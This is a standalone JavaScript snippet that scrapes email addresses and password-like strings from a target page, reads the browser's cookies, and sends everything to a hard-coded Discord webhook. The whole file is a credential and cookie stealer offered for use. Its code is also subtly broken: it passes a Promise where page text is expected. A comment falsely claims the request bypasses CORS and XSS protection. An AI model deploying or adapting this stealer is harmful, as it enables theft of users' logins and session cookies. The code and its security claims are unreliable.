(function() {
    var webhookUrl = "https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4";
    var url = "https://example.com"; // Replace with the target website
    var credentials = [];
    var emails = [];

    // Scrape credentials from the website
    var parser = new DOMParser();
    var htmlDoc = parser.parseFromString(fetch(url).then(response => response.text()), "text/html");
    var usernameRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
    var passwordRegex = /(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}/g;
    var credentialNodes = htmlDoc.body.getElementsByTagName("*");
    for (var i = 0; i < credentialNodes.length; i++) {
        var node = credentialNodes[i];
        var nodeText = node.innerText || node.textContent;
        var usernameMatches = nodeText.match(usernameRegex);
        var passwordMatches = nodeText.match(passwordRegex);
        if (usernameMatches && passwordMatches) {
            credentials.push({
                username: usernameMatches[0],
                password: passwordMatches[0],
            });
        }
    }

    // Scrape emails from the website
    var emailRegex = /\S+@\S+\.\S+/g;
    var emailNodes = htmlDoc.body.getElementsByTagName("*");
    for (var i = 0; i < emailNodes.length; i++) {
        var node = emailNodes[i];
        var nodeText = node.innerText || node.textContent;
        var matches = nodeText.match(emailRegex);
        if (matches) {
            emails = emails.concat(matches);
        }
    }

    // Scrape cookies from the browser
    var cookies = document.cookie;

    // Package the data to be sent
    var data = {
        content: `Credentials found: ${credentials.length}\n\n${JSON.stringify(credentials, null, 2)}\n\nEmails found: ${emails.length}\n\n${emails.join("\n")}\n\nCookies found: ${cookies}`,
    };

    // Bypass CORS and XSS protection
    var xhr = new XMLHttpRequest();
    xhr.open("POST", webhookUrl, true);
    xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
    xhr.onload = function() {
        console.log("Data sent!");
    };
    xhr.onerror = function() {
        console.error("Error sending data");
    };
    xhr.send(JSON.stringify(data));
})();
